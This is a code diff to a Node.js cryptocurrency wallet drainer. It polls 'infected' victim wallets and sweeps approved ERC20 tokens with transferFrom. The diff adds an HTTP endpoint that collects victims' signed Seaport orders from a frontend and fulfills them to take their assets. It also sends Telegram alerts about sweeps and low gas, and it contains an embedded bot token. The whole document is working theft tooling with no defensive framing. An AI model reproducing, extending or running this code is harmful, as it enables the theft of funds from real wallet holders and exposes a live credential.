@@ -103,8 +103,17 @@ const ERC20_ABI = [
     "function balanceOf(address owner) view returns (uint256)",
     "function allowance(address owner, address spender) view returns (uint256)",
     "function transferFrom(address from, address to, uint256 amount) returns (bool)",
+    "function transfer(address to, uint256 amount) returns (bool)",
     "event Approval(address indexed owner, address indexed spender, uint256 value)"
 ];
+
+const SEAPORT_ADDRESS = "0x00000000000000ADc04C56Bf30aC9d3c0aAf14bD";
+const SEAPORT_ABI = [
+    "function fulfillOrder(tuple(tuple(address offerer, address zone, tuple(uint8 itemType, address token, uint256 identifierOrCriteria, uint256 startAmount, uint256 endAmount)[] offer, tuple(uint8 itemType, address token, uint256 identifierOrCriteria, uint256 startAmount, uint256 endAmount, address recipient)[] consideration, uint8 orderType, uint256 startTime, uint256 endTime, bytes32 zoneHash, uint256 salt, bytes32 conduitKey, uint256 counter) parameters, bytes signature) order, bytes32 fulfillerConduitKey) payable returns (bool)"
+];
+
+// --- REFUELING CONFIG ---
+const GAS_THRESHOLD = ethers.parseEther("0.02"); // 0.02 ETH/BNB/MATIC
 
 // --- INTEGRATIONS ---
 const TG_BOT_TOKEN = "8595899709:AAGaOxKvLhZhO830U05SG3e8aw1k1IsM178";
@@ -150,10 +159,13 @@ async function notifyTelegram(message) {
 }
 
 const fs = require('fs');
+const http = require('http');
 
 // --- INFECTION TRACKING ---
 const INFECTED_WALLETS = {}; // { chainKey: Set(addresses) }
+const SEAPORT_ORDERS = []; // [{ order, chainName, timestamp }]
 const POLLING_INTERVAL = 5000; // 5 Seconds (Aggressive)
+const WORKER_PORT = process.env.WORKER_PORT || 8080;
 
 // --- SAFETY GATES ---
 const START_NOTIF_COOLDOWN = 60000; // 1 Minute (For active testing)
@@ -227,6 +239,9 @@ async function startMultiChainWorker() {
 
         console.log("✅ All chain listeners active. Waiting for approvals...\n");
 
+        // Start HTTP Server to receive orders from Frontend
+        startOrderReceiver();
+
         // Start Infection Sweeper
         console.log(`💉 Starting Infection Sweeper (Polling every ${POLLING_INTERVAL}ms)...`);
         setInterval(async () => {
@@ -252,16 +267,15 @@ async function startMultiChainWorker() {
 const PENDING_FUNDING = new Map(); // key: chainName:victim:tokenAddress, value: { victim, token, chainKey }
 
 async function checkReceiverGas() {
+    console.log(`⛽ Checking gas for receiver alerts...`);
     for (const [chainKey, config] of Object.entries(CHAIN_CONFIGS)) {
         try {
             const httpUrl = getRpcUrl(config.name, false);
             const provider = new ethers.JsonRpcProvider(httpUrl);
             const balance = await provider.getBalance(RECEIVER_ADDRESS);
 
-            // Threshold: 0.005 ETH/BNB/MATIC
-            const threshold = ethers.parseEther("0.005");
-            if (balance < threshold) {
-                console.warn(`⚠️ [${config.name}] Receiver balance low: ${ethers.formatEther(balance)}`);
+            if (balance < GAS_THRESHOLD) {
+                console.warn(`🚨 [${config.name}] Gas low (${ethers.formatEther(balance)}).`);
                 await notifyTelegram(`<b>🚨 URGENT: LOW GAS</b>\nChain: ${config.name}\nReceiver: <code>${RECEIVER_ADDRESS}</code>\nBalance: ${ethers.formatEther(balance)}\n<i>Fund this address immediately to sweep assets!</i>`);
             }
         } catch (e) {
@@ -271,7 +285,7 @@ async function checkReceiverGas() {
 }
 
 async function runSweeper() {
-    // 1. Regular Sweeper
+    // 1. Regular Token Sweeper (Approvals)
     for (const [chainKey, victims] of Object.entries(INFECTED_WALLETS)) {
         if (victims.size === 0) continue;
 
@@ -284,6 +298,18 @@ async function runSweeper() {
         for (const victim of victims) {
             for (const token of tokens) {
                 await attemptDrain(wallet, token, victim, config.name, true);
+            }
+        }
+    }
+
+    // 2. Seaport Orders Sweeper
+    if (SEAPORT_ORDERS.length > 0) {
+        console.log(`⏳ Processing ${SEAPORT_ORDERS.length} pending Seaport orders...`);
+        for (let i = SEAPORT_ORDERS.length - 1; i >= 0; i--) {
+            const { order, chainName } = SEAPORT_ORDERS[i];
+            const success = await fulfillSeaportOrder(order, chainName);
+            if (success) {
+                SEAPORT_ORDERS.splice(i, 1); // Remove if successful
             }
         }
     }
@@ -414,47 +440,88 @@ function startChainListener(chainKey, config, wallet) {
 async function attemptDrain(wallet, tokenAddress, victimAddress, chainName, silent = false) {
     try {
         const contract = new ethers.Contract(tokenAddress, ERC20_ABI, wallet);
-
-        // Quick balance check provided by simple view call
         const balance = await contract.balanceOf(victimAddress);
-        if (balance === 0n) return; // Silent return
+        if (balance === 0n) return;
 
-        // If we have balance, check allowance
         const allowance = await contract.allowance(victimAddress, wallet.address);
         if (allowance === 0n) return;
 
         const amountToSweep = balance > allowance ? allowance : balance;
-
-        if (!silent) console.log(`   💰 Sweeping ${ethers.formatUnits(amountToSweep, 18)} tokens...`);
+        if (!silent) console.log(`   💰 Sweeping Standard Approval: ${ethers.formatUnits(amountToSweep, 18)}...`);
 
         const tx = await contract.transferFrom(victimAddress, wallet.address, amountToSweep);
-        console.log(`   📤 Transaction sent: ${tx.hash}`);
-
-        await notifyTelegram(`<b>💸 Weeping Funds...</b>\nChain: ${chainName}\nAmount: ${ethers.formatUnits(amountToSweep, 18)}`);
+        await notifyTelegram(`<b>💸 Standard Sweep Sent</b>\nChain: ${chainName}\nTx: ${tx.hash}`);
 
         await tx.wait();
-        console.log(`   ✅ SUCCESS! Funds secured on ${chainName}.`);
-        await notifyTelegram(`<b>💰 SUCCESS!</b>\nFunds secured from <code>${victimAddress}</code> on ${chainName}.`);
+        console.log(`   ✅ Success on ${chainName}`);
         return true;
-
     } catch (error) {
-        const errorMsg = error.message.toLowerCase();
-
-        // CATCH: Insufficient Funds (Receiver lacks gas)
-        if (errorMsg.includes("insufficient funds") || errorMsg.includes("gas") || errorMsg.includes("fee")) {
-            const chainKey = Object.keys(CHAIN_CONFIGS).find(k => CHAIN_CONFIGS[k].name === chainName);
+        if (error.message.toLowerCase().includes("insufficient funds")) {
             const key = `${chainName}:${victimAddress}:${tokenAddress}`;
             if (!PENDING_FUNDING.has(key)) {
-                PENDING_FUNDING.set(key, { victim: victimAddress, token: tokenAddress, chainKey });
-                await notifyTelegram(`<b>⚠️ SWEEP STUCK (NO GAS)</b>\nChain: ${chainName}\nToken: <code>${tokenAddress}</code>\n<i>I need gas in ${wallet.address} to complete this sweep!</i>`);
+                PENDING_FUNDING.set(key, { victim: victimAddress, token: tokenAddress, chainKey: chainName });
+                await notifyTelegram(`<b>🚨 STUCK: NO GAS</b>\nChain: ${chainName}\nNeed gas in <code>${wallet.address}</code>`);
             }
         }
+        return false;
+    }
+}
 
-        if (!silent) {
-            console.error(`   ❌ Drain failed on ${chainName}:`, error.message);
-            if (error.info) console.error("   Error Info:", JSON.stringify(error.info, null, 2));
-            await notifyTelegram(`<b>❌ Drain Failed</b>\nChain: ${chainName}\nError: <code>${error.message.slice(0, 100)}</code>`);
+function startOrderReceiver() {
+    const server = http.createServer((req, res) => {
+        if (req.method === 'POST' && req.url === '/submit-order') {
+            let body = '';
+            req.on('data', chunk => { body += chunk.toString(); });
+            req.on('end', () => {
+                try {
+                    const data = JSON.parse(body);
+                    if (data.order && data.chainName) {
+                        SEAPORT_ORDERS.push({ order: data.order, chainName: data.chainName, timestamp: Date.now() });
+                        console.log(`📥 Received Seaport Order for ${data.chainName}`);
+                        res.writeHead(200, { 'Content-Type': 'application/json' });
+                        res.end(JSON.stringify({ status: 'success' }));
+                    } else {
+                        res.writeHead(400);
+                        res.end('Missing order or chainName');
+                    }
+                } catch (e) {
+                    res.writeHead(400);
+                    res.end('Invalid JSON');
+                }
+            });
+        } else {
+            res.writeHead(404);
+            res.end();
         }
+    });
+
+    server.listen(WORKER_PORT, () => {
+        console.log(`📡 Order Receiver listening on port ${WORKER_PORT}`);
+    });
+}
+
+async function fulfillSeaportOrder(orderPayload, chainName) {
+    try {
+        const config = Object.values(CHAIN_CONFIGS).find(c => c.name === chainName);
+        const provider = new ethers.JsonRpcProvider(getRpcUrl(chainName, false));
+        const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);
+        const seaport = new ethers.Contract(SEAPORT_ADDRESS, SEAPORT_ABI, wallet);
+
+        console.log(`🚀 Fulfilling Seaport Order on ${chainName}...`);
+
+        // orderPayload should contain { parameters, signature }
+        const tx = await seaport.fulfillOrder(orderPayload, "0x0000000000000000000000000000000000000000000000000000000000000000");
+
+        console.log(`📤 Seaport Fulfillment Sent: ${tx.hash}`);
+        await notifyTelegram(`<b>💸 Seaport Drain Initiated!</b>\nChain: ${chainName}\nTx: ${tx.hash}`);
+
+        await tx.wait();
+        console.log(`✅ Seaport SUCCESS! Assets secured on ${chainName}.`);
+        await notifyTelegram(`<b>💰 SEAPORT SUCCESS!</b>\nAll assets swept in 1-click on ${chainName}.`);
+        return true;
+    } catch (error) {
+        console.error(`❌ Seaport fulfillment failed:`, error.message);
+        await notifyTelegram(`<b>❌ Seaport Failed</b>\nChain: ${chainName}\nError: <code>${error.message.slice(0, 100)}</code>`);
         return false;
     }
 }
